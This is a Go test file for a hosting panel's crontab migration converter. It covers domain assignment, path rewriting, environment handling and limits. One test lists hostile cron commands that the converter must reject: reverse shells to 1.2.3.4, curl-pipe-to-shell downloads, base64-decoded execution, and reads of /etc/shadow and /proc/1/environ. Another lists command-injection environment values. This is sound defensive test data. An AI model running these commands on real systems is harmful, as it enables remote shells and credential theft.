package tasima

import (
	"errors"
	"fmt"
	"reflect"
	"strings"
	"testing"

	"girginospanel/internal/cron"
	"girginospanel/internal/tasima/arsiv"
)

// Arşiv cron çeviricisi: saf (ağ/DB/root yok). cron.Ekle yalnız cronKur
// testlerinde ve orada SAHTE ile çağrılır — gerçek depoya yazılmaz.

const (
	tEski = "abc"
	tSK   = "c_yeni"
)

func tBaglam() cronBaglam {
	return cronBaglam{
		EskiKullanici: tEski,
		AnaAlan:       "a.com",
		Alanlar: []arsiv.Alan{
			{Ad: "a.com", Tur: "ana", BelgeKoku: "public_html"},
			{Ad: "ek.com", Tur: "ek", BelgeKoku: "public_html/ek.com"},
			{Ad: "park.com", Tur: "park", BelgeKoku: "public_html"},
			{Ad: "bos.com", Tur: "ek"},
		},
	}
}

func tCevir(satirlar ...string) ([]cron.Gorev, []cronRed, []string) {
	return cronCevir(satirlar, tEski, tSK)
}

func TestCronAta_Alanlar(t *testing.T) {
	cases := []struct {
		ad, satir, alan string // alan "" → red
	}{
		{"yolsuz ana alan", "0 1 * * * php artisan x", "a.com"},
		{"ana belge kökü", "0 1 * * * php /home/abc/public_html/x.php", "a.com"},
		{"ek alan", "0 1 * * * php /home/abc/public_html/ek.com/c.php", "ek.com"},
		{"tilde", "0 1 * * * php ~/public_html/ek.com/c.php", "ek.com"},
		{"HOME", "0 1 * * * php $HOME/public_html/ek.com/c.php", "ek.com"},
		{"HOME süslü", "0 1 * * * php ${HOME}/public_html/ek.com/c.php", "ek.com"},
		{"önek yanlış eşleşmesi (ek.company)", "0 1 * * * php /home/abc/public_html/ek.company/c.php", "a.com"},
		{"başka kullanıcı öneki (abcd)", "0 1 * * * php /home/abcd/public_html/ek.com/c.php", "a.com"},
		{"nokta-nokta çözülür", "0 1 * * * php /home/abc/public_html/../public_html/ek.com/y.php", "ek.com"},
		{"belge kökü dışı yol", "0 1 * * * tar /home/abc/mail", "a.com"},
		{"aynı alan iki yol", "0 1 * * * cp /home/abc/public_html/ek.com/a /home/abc/public_html/ek.com/b", "ek.com"},
		{"çoklu alan", "0 1 * * * cp /home/abc/public_html/ek.com/a /home/abc/public_html/b", ""},
		{"çoklu alan tilde+mutlak", "0 1 * * * cp ~/public_html/ek.com/a /home/abc/public_html/b", ""},
	}
	for _, c := range cases {
		m, red := cronAta([]string{c.satir}, tBaglam())
		if c.alan == "" {
			if len(m) != 0 || len(red) != 1 || !strings.Contains(red[0].Neden, "birden çok alan adının dizinine") {
				t.Errorf("%s: red bekleniyordu: %v %v", c.ad, m, red)
			}
			continue
		}
		if len(red) != 0 || len(m[c.alan]) != 1 {
			t.Errorf("%s: %q alanına gitmeliydi: %v %v", c.ad, c.alan, m, red)
		}
	}
}

func TestCronAta_AnaAlanYokKosul(t *testing.T) {
	b := tBaglam()
	b.AnaAlan = ""
	m, red := cronAta([]string{"0 1 * * * echo x", "0 1 * * * php ~/public_html/ek.com/c.php"}, b)
	if len(red) != 1 || red[0].Neden != "alan adı belirlenemedi" || len(m["ek.com"]) != 1 {
		t.Fatalf("%v %v", m, red)
	}
}

func TestCronAta_OrtamSerpistirilir(t *testing.T) {
	satirlar := []string{
		`MAILTO=""`,
		"0 1 * * * php /home/abc/public_html/a.php",
		"FOO=bar",
		"0 2 * * * php /home/abc/public_html/ek.com/b.php",
		"0 3 * * * php /home/abc/public_html/c.php",
		"# yorum", "",
	}
	m, red := cronAta(satirlar, tBaglam())
	if len(red) != 0 {
		t.Fatal(red)
	}
	wantA := []string{`MAILTO=""`, satirlar[1], "FOO=bar", satirlar[4]}
	wantE := []string{`MAILTO=""`, "FOO=bar", satirlar[3]}
	if !reflect.DeepEqual(m["a.com"], wantA) || !reflect.DeepEqual(m["ek.com"], wantE) {
		t.Fatalf("a=%v\nek=%v", m["a.com"], m["ek.com"])
	}
	// sonuç doğrudan cronCevir'e verilebilir: FOO yalnız FOO'dan sonraki görevlere
	g, red2, _ := cronCevir(m["a.com"], tEski, tSK)
	if len(red2) != 0 || len(g) != 2 || strings.Contains(g[0].Komut, "FOO") || !strings.HasPrefix(g[1].Komut, "export FOO='bar'; ") {
		t.Fatalf("%+v %v", g, red2)
	}
	if g[0].Bildirim != "yok" || g[1].Bildirim != "yok" {
		t.Fatalf("MAILTO boş → yok: %+v", g)
	}
}

func TestCronAta_UzunSatirReddedilir(t *testing.T) {
	uzun := "0 1 * * * echo " + strings.Repeat("a", cronMaxSatir)
	m, red := cronAta([]string{uzun}, tBaglam())
	if len(m) != 0 || len(red) != 1 || red[0].Neden != "satır çok uzun" {
		t.Fatalf("%v %v", m, red)
	}
	if n := len([]rune(red[0].Satir)); n > cronKisaUzun+1 {
		t.Fatalf("satır kısaltılmamış: %d", n)
	}
}

func TestCronCevir_Zaman(t *testing.T) {
	ok := []struct{ satir, z string }{
		{"*/5 * * * * echo a", "*/5 * * * *"},
		{"0 3 1,15 jan-mar mon-fri echo a", "0 3 1,15 jan-mar mon-fri"},
		{"0  3\t*  * *   echo  a  b", "0 3 * * *"},
		{"@hourly echo a", "0 * * * *"},
		{"@daily echo a", "0 0 * * *"},
		{"@midnight echo a", "0 0 * * *"},
		{"@weekly echo a", "0 0 * * 0"},
		{"@monthly echo a", "0 0 1 * *"},
		{"@yearly echo a", "0 0 1 1 *"},
		{"@annually echo a", "0 0 1 1 *"},
	}
	for _, c := range ok {
		g, red, _ := tCevir(c.satir)
		if len(red) != 0 || len(g) != 1 {
			t.Errorf("%q: %v", c.satir, red)
			continue
		}
		z := strings.Join([]string{g[0].Dakika, g[0].Saat, g[0].Gun, g[0].Ay, g[0].Hafta}, " ")
		if z != c.z || !g[0].Etkin || g[0].Tip != "komut" || g[0].Bildirim != "bilgi" {
			t.Errorf("%q → %q %+v", c.satir, z, g[0])
		}
	}
	bad := []struct{ satir, neden string }{
		{"@reboot echo a", "@reboot panel zamanlayıcısında desteklenmez"},
		{"@foo echo a", "desteklenmeyen zamanlama"},
		{"@every5m echo a", "desteklenmeyen zamanlama"},
		{"*/5 * * * ? echo a", "geçersiz zaman ifadesi"},
		{"61x * * * * echo a", "geçersiz zaman ifadesi"},
		{"* * * *", "geçersiz zaman ifadesi"},
		{"0 0 * * *", "komut boş"},
		{"@daily", "komut boş"},
	}
	for _, c := range bad {
		g, red, _ := tCevir(c.satir)
		if len(g) != 0 || len(red) != 1 || red[0].Neden != c.neden {
			t.Errorf("%q: g=%v red=%v", c.satir, g, red)
		}
	}
}

func TestCronCevir_YolYeniden(t *testing.T) {
	g, red, _ := tCevir("0 1 * * * cd /home/abc && php /home/abc/public_html/x.php /home/abc/")
	if len(red) != 0 || g[0].Komut != "cd /home/c_yeni && php /home/c_yeni/public_html/x.php /home/c_yeni/" {
		t.Fatalf("%+v %v", g, red)
	}
	for _, k := range []string{
		"php ~/x.php", "php $HOME/x.php", "php /home/c_yeni/x.php", "ls /home/$USER/x", "ls /home/${USER}/x",
		"ls /var/www/home/baska/x", "ls /srv/home/abc/x", "ls /srv//home/baska/x",
	} {
		g, red, _ := tCevir("0 1 * * * " + k)
		if len(red) != 0 || len(g) != 1 {
			t.Errorf("%q: %v", k, red)
		}
	}
	// ~ ve $HOME dokunulmaz
	g, _, _ = tCevir("0 1 * * * php ~/a $HOME/b")
	if g[0].Komut != "php ~/a $HOME/b" {
		t.Errorf("tilde/HOME değişti: %q", g[0].Komut)
	}
	for _, k := range []string{
		"ls /home/abcd/x", "ls /home/abc2", "ls /home/baska/x", "ls /home/*/x", "ls /home/", "ls /home/$X/y",
		"cp /home/abc/a /home/baska/b", "ls /home/abc.bak/x", "ls /home/ab/x",
	} {
		g, red, _ := tCevir("0 1 * * * " + k)
		if len(g) != 0 || len(red) != 1 || red[0].Neden != "başka hesabın ev dizinine başvuruyor" {
			t.Errorf("%q: g=%v red=%v", k, g, red)
		}
	}
}

func TestCronCevir_Ortam(t *testing.T) {
	g, red, notlar := tCevir(
		"0 0 * * * onceki",
		`MAILTO="admin@ornek.com"`,
		"SHELL=/bin/bash",
		"PATH=/usr/local/bin:/usr/bin:/bin",
		"D=/home/abc/data",
		"0 1 * * * ilk",
		"PATH=/opt/x/bin:/usr/bin",
		"0 2 * * * ikinci",
		`MAILTO=`,
		"0 3 * * * ucuncu",
	)
	if len(red) != 0 || len(g) != 4 {
		t.Fatalf("%v %+v", red, g)
	}
	if g[0].Komut != "onceki" || g[0].Bildirim != "bilgi" {
		t.Errorf("ortamdan önceki görev etkilenmemeli: %+v", g[0])
	}
	if g[1].Komut != "export PATH='/usr/local/bin:/usr/bin:/bin'; export D='/home/c_yeni/data'; ilk" || g[1].Bildirim != "bilgi" {
		t.Errorf("ilk: %+v", g[1])
	}
	if g[2].Komut != "export PATH='/opt/x/bin:/usr/bin'; export D='/home/c_yeni/data'; ikinci" {
		t.Errorf("son değer kazanmalı: %q", g[2].Komut)
	}
	if g[3].Bildirim != "yok" {
		t.Errorf("MAILTO= → yok: %+v", g[3])
	}
	joined := strings.Join(notlar, "\n")
	for _, w := range []string{"MAILTO=admin@ornek.com panelde karşılığı yok", "/bin/bash — komutlar /bin/sh ile çalışır"} {
		if !strings.Contains(joined, w) {
			t.Errorf("not yok: %q in %q", w, joined)
		}
	}
	// MAILTO="" (çift tırnaklı boş) de "yok"
	g, _, _ = tCevir(`MAILTO=""`, "0 1 * * * x")
	if g[0].Bildirim != "yok" {
		t.Errorf("MAILTO=\"\": %+v", g[0])
	}
	_, _, n := tCevir("SHELL=/bin/zsh")
	if len(n) != 1 || !strings.Contains(n[0], "desteklenmiyor") {
		t.Errorf("zsh notu: %v", n)
	}
	_, _, n = tCevir("SHELL=/bin/sh")
	if len(n) != 0 {
		t.Errorf("sh için not olmamalı: %v", n)
	}
}

func TestCronCevir_OrtamYasakVeGuvensiz(t *testing.T) {
	for _, ad := range []string{"LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "BASH_ENV", "ENV", "IFS", "SHELLOPTS",
		"BASHOPTS", "PS4", "PROMPT_COMMAND", "HOME", "USER", "LOGNAME", "CDPATH", "GLOBIGNORE"} {
		g, red, _ := tCevir(ad+"=/tmp/x", "0 1 * * * echo ok")
		if len(red) != 1 || red[0].Neden != "güvensiz ortam değişkeni" {
			t.Errorf("%s: %v", ad, red)
		}
		// yalnız o satır reddedilir; sonraki görev etkilenmez
		if len(g) != 1 || g[0].Komut != "echo ok" {
			t.Errorf("%s: görev etkilendi: %+v", ad, g)
		}
	}
	for _, s := range []string{`X="a b"`, "X=$(id)", "X=`id`", "X=a;b", "X='a'b", "X=a|b", "X=$HOME", "X=a*"} {
		g, red, _ := tCevir(s, "0 1 * * * echo ok")
		if len(red) != 1 || red[0].Neden != "ortam değeri güvenli değil" || len(g) != 1 || strings.Contains(g[0].Komut, "export") {
			t.Errorf("%q: %v %+v", s, red, g)
		}
	}
	// ortam değeri de ev/tehlikeli denetiminden geçer
	_, red, _ := tCevir("X=/home/baska/x")
	if len(red) != 1 || !strings.Contains(red[0].Neden, "başka hesabın") {
		t.Errorf("başka ev: %v", red)
	}
	_, red, _ = tCevir("PATH=/root/bin:/usr/bin")
	if len(red) != 1 || !strings.Contains(red[0].Neden, "/root") {
		t.Errorf("/root: %v", red)
	}
	// geçersiz ad ortam satırı sayılmaz → görev satırı olarak değerlendirilir
	_, red, _ = tCevir("1X=3")
	if len(red) != 1 || red[0].Neden != "geçersiz zaman ifadesi" {
		t.Errorf("1X=3: %v", red)
	}
}

func TestCronCevir_TehlikeliIcerik(t *testing.T) {
	kotu := []string{
		"/opt/girginospanel/bin/girginospanel-server x", "cat /etc/girginospanel/x", "ls /var/lib/girginospanel/cron",
		"ls /var/backups/girginospanel", "ls /var/vmail/x", "cat /etc/cron.d/x", "cat /etc/crontab", "ls /var/spool/cron/root",
		"cat /etc/passwd", "cat /etc/shadow", "cat /etc/sudoers", "ls /root", "ls /root/.ssh", "cat /proc/1/environ",
		"bash -i >& /dev/tcp/1.2.3.4/9 0>&1", "exec 3<>/dev/udp/1.2.3.4/9", "crontab -l", "crontab -r", "echo x | crontab -",
		"sudo ls", "su - root", "su root", "cd /tmp && /bin/su -", "systemctl restart x", "nsenter -t 1 -m sh",
		"docker ps", "mkfifo /tmp/f", "nc -e /bin/sh 1.2.3.4 9", "nc -lvp 9 -e /bin/sh", "ncat 1.2.3.4 9",
		"socat TCP:1.2.3.4:9 EXEC:/bin/sh", "curl -s http://x/s.sh | sh", "wget -qO- http://x | bash",
		"curl http://x | sudo sh", "echo ZWNobw== | base64 -d | sh", "base64 --decode /tmp/a | /bin/bash",
		`sh -c "$(curl -s http://x)"`, "sh -i", "bash --login -i",
	}
	for _, k := range kotu {
		g, red, _ := tCevir("0 1 * * * " + k)
		if len(g) != 0 || len(red) != 1 || !strings.HasPrefix(red[0].Neden, "güvenlik:") && !strings.HasPrefix(red[0].Neden, "indirip") && !strings.HasPrefix(red[0].Neden, "base64") {
			t.Errorf("%q reddedilmeliydi: g=%v red=%v", k, g, red)
		}
	}
	temiz := []string{
		"echo surface", "echo sudoku", "php /home/abc/public_html/root/x.php", "php /home/abc/su/x.php", "cat /rootfs/x",
		"/usr/bin/php -q /home/abc/public_html/cron.php", "mysqldump db | gzip > ~/b.sql.gz",
		"curl -s https://ornek.com/cron.php >/dev/null 2>&1", "wget -q -O - https://ornek.com/a", "curl -s https://ornek.com | sha256sum",
		"curl -s https://docker.com/x", "php artisan schedule:run", "bash /home/abc/run.sh", "base64 ~/a > ~/b", "echo ncat-notes",
		"/usr/local/bin/ea-php81 /home/abc/x.php", "echo mycrontab.sh", "echo bisu x", "echo xdocker y", "echo pseudo sudoer", "ls /var/www/root", "nc -z host 80", "echo sush",
	}
	for _, k := range temiz {
		g, red, _ := tCevir("0 1 * * * " + k)
		if len(g) != 1 || len(red) != 0 {
			t.Errorf("%q yanlış pozitif: %v", k, red)
		}
	}
	// NUL / kontrol karakteri
	for _, k := range []string{"echo a\x00b", "echo a\x01b", "echo a\x7fb"} {
		g, red, _ := tCevir("0 1 * * * " + k)
		if len(g) != 0 || len(red) != 1 || red[0].Neden != "kontrol karakteri içeriyor" {
			t.Errorf("%q: %v", k, red)
		}
		if strings.ContainsAny(red[0].Satir, "\x00\x01\x7f") {
			t.Errorf("rapor satırı temizlenmemiş: %q", red[0].Satir)
		}
	}
	// TAB serbest
	if g, red, _ := tCevir("0 1 * * *\techo\ta"); len(g) != 1 || len(red) != 0 {
		t.Errorf("tab: %v", red)
	}
}

func TestCronCevir_Tavanlar(t *testing.T) {
	g, red, _ := tCevir("0 1 * * * " + strings.Repeat("a", cronMaxKomut+1))
	if len(g) != 0 || len(red) != 1 || red[0].Neden != "komut çok uzun" {
		t.Errorf("1024 üstü: %v", red)
	}
	// tam sınır geçer
	if g, red, _ := tCevir("0 1 * * * " + strings.Repeat("a", cronMaxKomut)); len(g) != 1 || len(red) != 0 {
		t.Errorf("tam 1024: %v", red)
	}
	k := strings.Repeat("b", cronMaxKomut-len("export X='1'; "))
	if g, red, _ := tCevir("X=1", "0 1 * * * "+k); len(g) != 1 || len(red) != 0 {
		t.Errorf("tam sınır: %v", red)
	}
	// ortam öneki sınırı aşırır
	if g, red, _ := tCevir("X=1", "0 1 * * * "+k+"c"); len(g) != 0 || len(red) != 1 || red[0].Neden != "komut çok uzun" {
		t.Errorf("önek dahil aşım: %v", red)
	}
	var sat []string
	for i := 0; i < cronMaxGorev+3; i++ {
		sat = append(sat, fmt.Sprintf("0 1 * * * echo %d", i))
	}
	g, red, _ = tCevir(sat...)
	if len(g) != cronMaxGorev || len(red) != 3 || red[0].Neden != "görev sınırı (100)" {
		t.Errorf("100 sınırı: g=%d red=%v", len(g), red)
	}
	g, red, _ = tCevir("0 1 * * * echo " + strings.Repeat("a", cronMaxSatir))
	if len(g) != 0 || len(red) != 1 || red[0].Neden != "satır çok uzun" {
		t.Errorf("4096: %v", red)
	}
}

func TestCronTemizle(t *testing.T) {
	s := cronTemizle("a\x00b\nc" + strings.Repeat("ş", 300))
	if strings.ContainsAny(s, "\x00\n") || len([]rune(s)) != cronKisaUzun+1 || !strings.HasSuffix(s, "…") {
		t.Errorf("%q", s)
	}
	if cronTemizle("kısa") != "kısa" {
		t.Error("kısa değişti")
	}
	if !strings.Contains(cronTemizle("a\xffb"), "?") {
		t.Error("geçersiz UTF-8")
	}
}

func TestCronRaporMetni(t *testing.T) {
	if cronRaporMetni(0, 0, nil) != nil {
		t.Error("boş → nil")
	}
	r := cronRaporMetni(3, 2, nil)
	if !reflect.DeepEqual(r, []string{"Cron: 3 satır taşındı, 2 zaten vardı"}) {
		t.Errorf("%v", r)
	}
	var redler []cronRed
	for i := 0; i < 13; i++ {
		redler = append(redler, cronRed{fmt.Sprintf("satir%d", i), "neden"})
	}
	r = cronRaporMetni(1, 0, redler)
	if len(r) != 12 || r[1] != `Cron taşınamadı: "satir0" — neden` || r[11] != "Cron: … 3 satır daha taşınamadı" {
		t.Errorf("%d %v", len(r), r)
	}
	r = cronRaporMetni(0, 0, redler[:1])
	if len(r) != 2 || r[0] != "Cron: 0 satır taşındı, 0 zaten vardı" {
		t.Errorf("%v", r)
	}
}

func TestCronKur_EkleSahte(t *testing.T) {
	eski := cronEkle
	defer func() { cronEkle = eski }()
	var gelen []cron.Gorev
	cronEkle = func(sk string, g []cron.Gorev) (cron.EkleSonuc, error) {
		if sk != tSK {
			t.Errorf("sk=%q", sk)
		}
		gelen = g
		return cron.EkleSonuc{Eklenen: 1, Yinelenen: 0, Reddedilen: []cron.Red{{Idx: 1, Neden: "görev sınırı (100)"}}}, nil
	}
	e, y, red, notlar, err := cronKur(tSK, []string{"0 1 * * * echo a", "5 1 * * * echo b", "@reboot x", "MAILTO=a@b.c"}, tEski)
	if err != nil || e != 1 || y != 0 || len(gelen) != 2 || len(notlar) != 1 {
		t.Fatalf("%d %d %v %v %v", e, y, red, notlar, err)
	}
	if len(red) != 2 || red[0].Neden != "@reboot panel zamanlayıcısında desteklenmez" ||
		red[1].Neden != "görev sınırı (100)" || !strings.Contains(red[1].Satir, "echo b") {
		t.Fatalf("redler: %v", red)
	}
	// askı hatası iletilir
	cronEkle = func(string, []cron.Gorev) (cron.EkleSonuc, error) { return cron.EkleSonuc{}, cron.ErrAskida }
	if _, _, _, _, err := cronKur(tSK, []string{"0 1 * * * echo a"}, tEski); !errors.Is(err, cron.ErrAskida) {
		t.Fatalf("askı: %v", err)
	}
	// görev yoksa Ekle çağrılmaz
	cronEkle = func(string, []cron.Gorev) (cron.EkleSonuc, error) {
		t.Error("çağrılmamalıydı")
		return cron.EkleSonuc{}, nil
	}
	if _, _, red, _, err := cronKur(tSK, []string{"@reboot x"}, tEski); err != nil || len(red) != 1 {
		t.Fatalf("%v %v", red, err)
	}
}
